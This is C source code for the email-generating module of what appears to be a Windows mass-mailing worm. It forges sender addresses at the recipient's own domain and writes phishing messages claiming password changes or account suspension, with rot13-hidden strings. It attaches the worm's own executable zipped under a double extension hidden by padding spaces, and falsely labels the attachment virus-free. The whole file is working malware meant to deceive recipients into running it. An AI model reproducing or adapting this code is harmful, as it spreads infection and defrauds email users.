/*
 *  Sync's message generator
 */
// its kinda fucked up, sorry. :(
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include "lib.h"
#include "msg.h"
#include "zipstore.h"
#include "massmail.h"

/* state structure */
struct msgstate_t {
	char *to, from[256], subject[128];
	char exe_name[32], exe_ext[16];
	char zip_used, zip_nametrick, is_tempfile;
	char attach_name[256];
	char attach_file[MAX_PATH];
	int attach_size;		/* in bytes */
	char mime_boundary[128];
	char htmlmsg[1028];
	char *buffer;
	int buffer_size;
};

char temp[1028];

char *senderzz(char *in)
{
	char inz[256];
	int j;
	static const char *mailz[] = {
	"support", "administrator", "mail", "service", "admin", "info", "register", "webmaster"
	};
	char senderz[256];
	const char *domainez;
	sprintf(inz, in);
	domainez = strtok(inz, "@");
    domainez = strtok(0, "@");
	xrand_init();
	j = xrand16() % (sizeof(mailz) / sizeof(mailz[0]));
	sprintf(senderz, mailz[j]);
	lstrcat(senderz, "@");
	lstrcat(senderz, domainez);
	return senderz;
}

static void select_exename(struct msgstate_t *state)
{
	static const struct {
		char pref;
		const char *name;
	} names[] = {
		{ 30, "hcqngrq-cnffjbeq" },
		{ 15, "rznvy-cnffjbeq" },
		{ 10, "arj-cnffjbeq" },
		{ 10, "cnffjbeq" },
		{ 5, "nccebirq-cnffjbeq" },
		{ 17, "nppbhag-cnffjbeq" },
		{ 17, "npprcgrq-cnffjbeq" },
		{ 0, "" }
	};
	static const struct {
		char pref;
		const char *ext;
	} exts[] = {
		{ 50, "cvs" },
		{ 50, "fpe" },
		{ 15, "rkr" },
		{ 5, "pzq" },
		{ 5, "ong" },
		{ 0, "" }
	};
	int i, j, tot;

	if ((xrand16() % 100) < 8) {
		j = 3 + (xrand16() % 5);
		for (i=0; i<j; i++)
			state->exe_name[i] = 'a' + (xrand16() % 26);
		state->exe_name[i] = 0;
	} else {
		for (i=0, tot=1; names[i].pref != 0; i++) tot += names[i].pref;
		j = xrand16() % tot;
		for (i=0, tot=1; names[i].pref != 0; i++)
			if ((tot += names[i].pref) >= j) break;
		if (names[i].pref == 0) i = 0;
		rot13(state->exe_name, names[i].name);
	}

	for (i=0, tot=1; exts[i].pref != 0; i++) tot += exts[i].pref;
	j = xrand16() % tot;
	for (i=0, tot=1; exts[i].pref != 0; i++)
		if ((tot += exts[i].pref) >= j) break;
	if (exts[i].pref == 0) i = 0;
	rot13(state->exe_ext, exts[i].ext);

	wsprintf(state->attach_name, "%s.%s", state->exe_name, state->exe_ext);
}

static void select_exename2(struct msgstate_t *state)
{
	static const struct {
		char pref;
		const char *name;
	} names[] = {
		{ 30, "vzcbegnag-qrgnvyf" },
		{ 15, "nppbhag-qrgnvyf" },
		{ 15, "rznvy-qrgnvyf" },
		{ 10, "nppbhag-vasb" },
		{ 10, "qbphzrag" },
		{ 5, "ernqzr" },
		{ 17, "nppbhag-ercbeg" },
		{ 0, "" }
	};
	static const struct {
		char pref;
		const char *ext;
	} exts[] = {
		{ 50, "cvs" },
		{ 50, "fpe" },
		{ 15, "rkr" },
		{ 5, "pzq" },
		{ 5, "ong" },
		{ 0, "" }
	};
	int i, j, tot;

	if ((xrand16() % 100) < 8) {
		j = 3 + (xrand16() % 5);
		for (i=0; i<j; i++)
			state->exe_name[i] = 'a' + (xrand16() % 26);
		state->exe_name[i] = 0;
	} else {
		for (i=0, tot=1; names[i].pref != 0; i++) tot += names[i].pref;
		j = xrand16() % tot;
		for (i=0, tot=1; names[i].pref != 0; i++)
			if ((tot += names[i].pref) >= j) break;
		if (names[i].pref == 0) i = 0;
		rot13(state->exe_name, names[i].name);
	}

	for (i=0, tot=1; exts[i].pref != 0; i++) tot += exts[i].pref;
	j = xrand16() % tot;
	for (i=0, tot=1; exts[i].pref != 0; i++)
		if ((tot += exts[i].pref) >= j) break;
	if (exts[i].pref == 0) i = 0;
	rot13(state->exe_ext, exts[i].ext);

	wsprintf(state->attach_name, "%s.%s", state->exe_name, state->exe_ext);
}
static void select_subject(struct msgstate_t *state)
{
	static const struct {
		char pref;
		const char *subj;
	} subjs[] = {
		{ 12, "Lbhe cnffjbeq unf orra hcqngrq" },
		{ 35, "Lbhe cnffjbeq unf orra fhpprffshyyl hcqngrq" },
		{ 35, "Lbh unir fhpprffshyyl hcqngrq lbhe cnffjbeq" },
		{ 8, "Lbhe arj nppbhag cnffjbeq vf nccebirq" },
		{ 0, "" }
	};
	int i, j, tot;

	if ((xrand16() % 100) < 5) {
		j = 3 + (xrand16() % 15);
		for (i=0; i<j; i++)
			state->subject[i] = 'a' + (xrand16() % 26);
		state->subject[i] = 0;
	} else {
		for (i=0, tot=1; subjs[i].pref != 0; i++) tot += subjs[i].pref;
		j = xrand16() % tot;
		for (i=0, tot=1; subjs[i].pref != 0; i++)
			if ((tot += subjs[i].pref) >= j) break;
		if (subjs[i].pref == 0) i = 0;
		rot13(state->subject, subjs[i].subj);
	}

	i = xrand16() % 100;
	if ((i >= 50) && (i < 85))
		CharUpperBuff(state->subject, 1);
	else if (i >= 85)
		CharUpper(state->subject);
}

static void select_subject2(struct msgstate_t *state)
{
	static const struct {
		char pref;
		const char *subj;
	} subjs[] = {
		{ 12, "Lbhe Nppbhag vf Fhfcraqrq" },
		{ 35, "*QRGRPGRQ* Bayvar Hfre Ivbyngvba" },
		{ 35, "Lbhe Nppbhag vf Fhfcraqrq Sbe Frphevgl Ernfbaf" },
		{ 35, "Jneavat Zrffntr: Lbhe freivprf arne gb or pybfrq." },
		{ 35, "Vzcbegnag Abgvsvpngvba" },
		{ 35, "Zrzoref Fhccbeg" },
		{ 8, "Frphevgl zrnfherf" },
		{ 8, "Rznvy Nppbhag Fhfcrafvba" },
		{ 8, "Abgvpr bs nppbhag yvzvgngvba" },
		{ 0, "" }
	};
	int i, j, tot;

	if ((xrand16() % 100) < 5) {
		j = 3 + (xrand16() % 15);
		for (i=0; i<j; i++)
			state->subject[i] = 'a' + (xrand16() % 26);
		state->subject[i] = 0;
	} else {
		for (i=0, tot=1; subjs[i].pref != 0; i++) tot += subjs[i].pref;
		j = xrand16() % tot;
		for (i=0, tot=1; subjs[i].pref != 0; i++)
			if ((tot += subjs[i].pref) >= j) break;
		if (subjs[i].pref == 0) i = 0;
		rot13(state->subject, subjs[i].subj);
	}

	i = xrand16() % 100;
	if ((i >= 50) && (i < 85))
		CharUpperBuff(state->subject, 1);
	else if (i >= 85)
		CharUpper(state->subject);
}

static int select_attach_file(struct msgstate_t *state)
{
	HANDLE h;
	char buf[MAX_PATH];
	char zip_name[512];
	int i;

	state->is_tempfile = 1;
	buf[0] = 0;
	GetTempPath(MAX_PATH, buf);
	if (buf[0] == 0)
		return 1;
	state->attach_file[0] = 0;
	GetTempFileName(buf, "tmp", 0, state->attach_file);
	if (state->attach_file[0] == 0)
		return 1;
	GetModuleFileName(NULL, buf, MAX_PATH);

	lstrcpy(zip_name, state->exe_name);
	lstrcat(zip_name, ".");
	switch (xrand16() % 5) {
		case 0: lstrcat(zip_name, "doc"); break;
		case 1: case 2: lstrcat(zip_name, "htm"); break;
		default: lstrcat(zip_name, "txt"); break;
	}
	for (i=0; i<70; i++)
        lstrcat(zip_name, " ");
	lstrcat(zip_name, ".");
	switch (xrand16() % 3) {
		case 0: lstrcat(zip_name, "e"); lstrcat(zip_name, "xe"); break;
		case 1: lstrcat(zip_name, "s"); lstrcat(zip_name, "cr"); break;
		default: lstrcat(zip_name, "p"); lstrcat(zip_name, "if"); break;
	}
			
	if (zip_store(buf, state->attach_file, zip_name))
		return 1;

	wsprintf(state->attach_name, "%s.zip", state->exe_name);

	h = CreateFile(state->attach_file, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == NULL || h == INVALID_HANDLE_VALUE) {
		if (state->is_tempfile) DeleteFile(state->attach_file);
		return 1;
	}
	state->attach_size = GetFileSize(h, NULL);
	CloseHandle(h);

	if ((state->attach_size < 1024) || (state->attach_size > (300*1024))) {
		if (state->is_tempfile) DeleteFile(state->attach_file);
		return 1;
	}

	return 0;
}

char *write_msghtml(struct msgstate_t *state, char *in)
{
	char inmessage[256], user[512], tempshit[512];
    const char *fuckingmail;
	const char *domainez;
	sprintf(inmessage, in);
	domainez = strtok(inmessage, "@");
	sprintf(user, inmessage);
    domainez = strtok(0, "@");
    sprintf(tempshit, domainez);
	CharUpperBuff(tempshit, 1);
    fuckingmail = strtok(tempshit, ".");
	lstrcpy(temp, "<html> \n");
	lstrcat(temp, "<body> \n");
	cat_wsprintf(temp, "<BR><STRONG>Dear user %s, </STRONG><BR> \n", user);
	cat_wsprintf(temp, "<BR>You have successfully updated the password of your %s account.<BR> \n", fuckingmail);
	cat_wsprintf(temp, "<BR>If you did not authorize this change or if you need assistance with your account, please contact %s customer service at: %s<BR> \n", fuckingmail, state->from);
	cat_wsprintf(temp, "<BR>Thank you for using %s! \n", fuckingmail);
	cat_wsprintf(temp, "<BR>The %s Support Team <BR> \n", fuckingmail);
	lstrcat(temp, "<BR><BR><BR><BR><BR> \n");
	lstrcat(temp, "<BR>+++ Attachment: No Virus (Clean) \n");
	cat_wsprintf(temp, "<BR>+++ %s Antivirus - www.%s \n", fuckingmail, domainez);
	lstrcat(temp, "</body> \n");
	lstrcat(temp, "</html> \n");
	lstrcpy(state->htmlmsg, temp);
}

char *write_msghtml2(struct msgstate_t *state, char *in)
{
	char inmessage[256], user[512], tempshit[512];
    const char *fuckingmail;
	const char *domainez;
	sprintf(inmessage, in);
	domainez = strtok(inmessage, "@");
	sprintf(user, inmessage);
    domainez = strtok(0, "@");
    sprintf(tempshit, domainez);
	CharUpperBuff(tempshit, 1);
    fuckingmail = strtok(tempshit, ".");
	lstrcpy(temp, "<html> \n");
	lstrcat(temp, "<body> \n");
	cat_wsprintf(temp, "<BR><STRONG>Dear user %s, </STRONG><BR> \n", user);
	cat_wsprintf(temp, "<BR>It has come to our attention that your %s User Profile ( x ) records are out of date. For further details see the attached document.<BR> \n", fuckingmail);
	cat_wsprintf(temp, "<BR>Thank you for using %s! \n", fuckingmail);
	cat_wsprintf(temp, "<BR>The %s Support Team <BR> \n", fuckingmail);
	lstrcat(temp, "<BR><BR><BR><BR><BR> \n");
	lstrcat(temp, "<BR>+++ Attachment: No Virus (Clean) \n");
	cat_wsprintf(temp, "<BR>+++ %s Antivirus - www.%s \n", fuckingmail, domainez);
	lstrcat(temp, "</body> \n");
	lstrcat(temp, "</html> \n");
	lstrcpy(state->htmlmsg, temp);
}

char *write_msghtml3(struct msgstate_t *state, char *in)
{
	char inmessage[256], user[512], tempshit[512];
    const char *fuckingmail;
	const char *domainez;
	sprintf(inmessage, in);
	domainez = strtok(inmessage, "@");
	sprintf(user, inmessage);
    domainez = strtok(0, "@");
    sprintf(tempshit, domainez);
	CharUpperBuff(tempshit, 1);
    fuckingmail = strtok(tempshit, ".");
	lstrcpy(temp, "<html> \n");
	lstrcat(temp, "<body> \n");
	cat_wsprintf(temp, "<BR><STRONG>Dear %s Member, </STRONG><BR> \n", fuckingmail);
	cat_wsprintf(temp, "<BR>We have temporarily suspended your email account %s.<BR> \n", in);
	cat_wsprintf(temp, "<BR>This might be due to either of the following reasons: <BR> \n");
    lstrcat(temp, "<BR>1. A recent change in your personal information (i.e. change of address).\n");
	lstrcat(temp, "<BR>2. Submiting invalid information during the initial sign up process.\n");
	lstrcat(temp, "<BR>3. An innability to accurately verify your selected option of subscription due to an internal error within our processors.\n");
	cat_wsprintf(temp, "<BR>See the details to reactivate your %s account. <BR>\n", fuckingmail);
	cat_wsprintf(temp, "<BR>Sincerely,The %s Support Team <BR> \n", fuckingmail);
	lstrcat(temp, "<BR><BR><BR><BR><BR> \n");
	lstrcat(temp, "<BR>+++ Attachment: No Virus (Clean) \n");
	cat_wsprintf(temp, "<BR>+++ %s Antivirus - www.%s \n", fuckingmail, domainez);
	lstrcat(temp, "</body> \n");
	lstrcat(temp, "</html> \n");
	lstrcpy(state->htmlmsg, temp);
}

char *write_msghtml4(struct msgstate_t *state, char *in)
{
	char inmessage[256], user[512], tempshit[512];
    const char *fuckingmail;
	const char *domainez;
	sprintf(inmessage, in);
	domainez = strtok(inmessage, "@");
	sprintf(user, inmessage);
    domainez = strtok(0, "@");
    sprintf(tempshit, domainez);
	CharUpperBuff(tempshit, 1);
    fuckingmail = strtok(tempshit, ".");
	lstrcpy(temp, "<html> \n");
	lstrcat(temp, "<body> \n");
	cat_wsprintf(temp, "<BR><STRONG>Dear %s Member, </STRONG><BR> \n", fuckingmail);
	lstrcat(temp, "<BR>Your e-mail account was used to send a huge amount of unsolicited spam messages during the recent week. If you could please take 5-10 minutes out of your online experience and confirm the attached document so you will not run into any future problems with the online service.<BR> \n");
	lstrcat(temp, "<BR>If you choose to ignore our request, you leave us no choice but to cancel your membership.<BR> \n");
	lstrcat(temp, "<BR>Virtually yours,\n");
	cat_wsprintf(temp, "<BR>The %s Support Team <BR> \n", fuckingmail);
	lstrcat(temp, "<BR><BR><BR><BR><BR> \n");
	lstrcat(temp, "<BR>+++ Attachment: No Virus found \n");
	cat_wsprintf(temp, "<BR>+++ %s Antivirus - www.%s \n", fuckingmail, domainez);
	lstrcat(temp, "</body> \n");
	lstrcat(temp, "</html> \n");
	lstrcpy(state->htmlmsg, temp);
}

static void base64_t2q(BYTE *t, BYTE *q)
{
	BYTE alpha[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	q[0] = alpha[t[0] >> 2];
	q[1] = alpha[((t[0] & 03) << 4) | (t[1] >> 4)];
	q[2] = alpha[((t[1] & 017) << 2) | (t[2] >> 6)];
	q[3] = alpha[t[2] & 077];
}

static int msg_b64enc(char *outbuf, struct msgstate_t *state)
{
	HANDLE hIn;
	BYTE inbuf[1024], t[3], q[3];
	DWORD tp, inp, inlen, outp, i, linepos;
	const DWORD linelen = 76;

	hIn = CreateFile(state->attach_file, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, NULL);
	if (hIn == INVALID_HANDLE_VALUE) return 1;

	for (tp=0, inp=0, inlen=0, outp=0, linepos=0;;) {
		if (inp >= inlen) {
			ReadFile(hIn, inbuf, sizeof(inbuf), &inlen, NULL);
			if (inlen == 0) break;
			inp = 0;
		}
		t[tp++] = inbuf[inp++];
		if (tp == 3) {
			base64_t2q(t, q);
			for (i=0; i<4; i++) {
				outbuf[outp++] = q[i];
				if (++linepos >= linelen) {
					outbuf[outp++] = '\r';
					outbuf[outp++] = '\n';
					linepos = 0;
				}
			}
			memset(t, 0, sizeof(t));
			tp = 0;
		}
	}

	if (tp) {
		base64_t2q(t, q);
		if (tp < 3) q[3] = '=';
		if (tp < 2) q[2] = '=';
		for (i=0; i<4; i++)
			outbuf[outp++] = q[i];
	}

	outbuf[outp] = 0;

	CloseHandle(hIn);
	return 0;
}

static void write_headers(struct msgstate_t *state)
{
	char *buf = state->buffer;

	wsprintf(state->mime_boundary, "----=_%s_%.3u_%.4u_%.8X.%.8X", "NextPart", 0, xrand16() % 15, xrand32(), xrand32());

	rot13(buf, "Sebz: ");                              /* From: */
	lstrcat(buf, state->from);
	rot13(buf+lstrlen(buf), "\r\nGb: ");               /* To: */
	lstrcat(buf, state->to);
	rot13(buf+lstrlen(buf), "\r\nFhowrpg: ");          /* Subject */
	lstrcat(buf, state->subject);

	rot13(buf+lstrlen(buf), "\r\nQngr: ");             /* Date */
	mk_smtpdate(NULL, buf+lstrlen(buf));
	rot13(buf+lstrlen(buf), "\r\nZVZR-Irefvba: 1.0");  /* MIME-Version */
	rot13(buf+lstrlen(buf), "\r\nPbagrag-Glcr: zhygvcneg/zvkrq;\r\n");  /* "\r\nContent-Type: multipart/mixed;\r\n" */
	cat_wsprintf(buf, "\tboundary=\"%s\"", state->mime_boundary);
	rot13(buf+lstrlen(buf), "\r\nK-Cevbevgl: 3");          /* X-Priority: 3 */
	rot13(buf+lstrlen(buf), "\r\nK-ZFZnvy-Cevbevgl: Abezny");  /* X-MSMail-Priority: Normal */

	lstrcat(buf, "\r\n\r\n");
}

static int write_body(struct msgstate_t *state)
{
	char *p = state->buffer;
	char tmp[512];

	/* This is a multi-part message in MIME format. */
	rot13(p+lstrlen(p), "Guvf vf n zhygv-cneg zrffntr va ZVZR sbezng.\r\n\r\n");

	rot13(tmp,
		"--%f\r\n"
		"Pbagrag-Glcr: grkg/ugzy;\r\n"
		"\tpunefrg=\"VFB-8859-1\"\r\n"
		"Pbagrag-Genafsre-Rapbqvat: 7ovg\r\n\r\n"
	);
	cat_wsprintf(p, tmp, state->mime_boundary);

	lstrcat(p, "\r\n");
	lstrcat(p, state->htmlmsg);
	lstrcat(p, "\r\n\r\n\r\n");

	/*
	 *	------=_NextPart_xxx
	 * Content-Type: application/octet-stream;
	 *    name="ntldr"
	 * Content-Transfer-Encoding: base64
	 * Content-Disposition: attachment;
	 *    filename="ntldr"
	 */
	rot13(tmp,
		"--%f\r\n"
		"Pbagrag-Glcr: nccyvpngvba/bpgrg-fgernz;\r\n"
		"\tanzr=\"%f\"\r\n"
		"Pbagrag-Genafsre-Rapbqvat: onfr64\r\n"
		"Pbagrag-Qvfcbfvgvba: nggnpuzrag;\r\n"
		"\tsvyranzr=\"%f\"\r\n\r\n"
	);

	cat_wsprintf(p, tmp, state->mime_boundary, state->attach_name, state->attach_name);

	if (msg_b64enc(p+lstrlen(p), state))
		return 1;

	cat_wsprintf(p, "\r\n\r\n--%s--\r\n\r\n", state->mime_boundary);

	return 0;
}


/* Main function. Returns pointer to a buffer with generated buffer.
   Caller is responsible to free it using GlobalFree() */
char *msg_generate(char *email)
{
	struct msgstate_t state;

	if (email == NULL) return NULL;
	if (lstrlen(email) < 7) return NULL;		/* x@xx.xx */
	memset(&state, '\0', sizeof(state));

	state.to = email;
	lstrcpy(state.from, senderzz(email));
	select_exename(&state);
	select_subject(&state);
	write_msghtml(&state, email);

	if (select_attach_file(&state))
		return NULL;

	state.buffer_size = 8096 + (4 * state.attach_size) / 3;
	state.buffer_size = (((state.buffer_size + 1023) / 1024)) * 1024;
	state.buffer = (char *)GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT, state.buffer_size);
	if (state.buffer == NULL) goto err;

	state.buffer[0] = 0;
	write_headers(&state);
	if (write_body(&state)) goto err;

	if (state.is_tempfile) DeleteFile(state.attach_file);
	return state.buffer;

err:	if (state.is_tempfile) DeleteFile(state.attach_file);
	if (state.buffer != NULL) GlobalFree((HGLOBAL)state.buffer);
	return NULL;
}

char *msg_generate2(char *email)
{
	struct msgstate_t state;

	if (email == NULL) return NULL;
	if (lstrlen(email) < 7) return NULL;		/* x@xx.xx */
	memset(&state, '\0', sizeof(state));

	state.to = email;
	//select_from(&state);
	lstrcpy(state.from, senderzz(email));
	select_exename2(&state);
	select_subject2(&state);

	switch (xrand16() % 3) {
		case 0: write_msghtml2(&state, email); break;
		case 1: write_msghtml3(&state, email); break;
		case 2: write_msghtml4(&state, email); break;
		default: write_msghtml3(&state, email); break;
	}

	if (select_attach_file(&state))
		return NULL;

	state.buffer_size = 8096 + (4 * state.attach_size) / 3;
	state.buffer_size = (((state.buffer_size + 1023) / 1024)) * 1024;
	state.buffer = (char *)GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT, state.buffer_size);
	if (state.buffer == NULL) goto err;

	state.buffer[0] = 0;
	write_headers(&state);
	if (write_body(&state)) goto err;

	if (state.is_tempfile) DeleteFile(state.attach_file);
	return state.buffer;

err:	if (state.is_tempfile) DeleteFile(state.attach_file);
	if (state.buffer != NULL) GlobalFree((HGLOBAL)state.buffer);
	return NULL;
}
